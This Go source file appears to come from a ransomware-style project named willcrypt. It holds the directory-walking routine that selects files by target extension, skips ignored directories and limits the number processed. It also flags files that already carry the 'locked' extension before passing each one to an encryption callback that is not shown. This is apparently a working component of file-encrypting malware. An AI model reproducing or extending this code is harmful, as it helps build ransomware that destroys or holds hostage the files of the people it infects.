package main

import (
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"

	"github.com/sywc670/willcrypt/internal/config"
	"github.com/sywc670/willcrypt/pkg/gowalk"
)

func walk(startDir string, wg *sync.WaitGroup, fn func(string, bool)) {
	var count int32

	filter := func(filePath string, args ...any) {
		defer wg.Done()
		var proceed bool

		for _, ext := range config.Extensions {
			if strings.HasSuffix(filePath, ext) || strings.HasSuffix(filePath, config.LockedExtension) {
				proceed = true
				break
			}
		}

		for _, dir := range config.IgnoreDirs {
			if strings.Contains(filepath.Dir(filePath), dir) {
				proceed = false
				break
			}
		}

		if proceed && count < config.ProcessMax {
			atomic.AddInt32(&count, 1)

			isEncrypted := strings.HasSuffix(filePath, config.LockedExtension)

			fn(filePath, isEncrypted)
		}

	}

	gowalk.Walk(startDir, wg, filter)
}
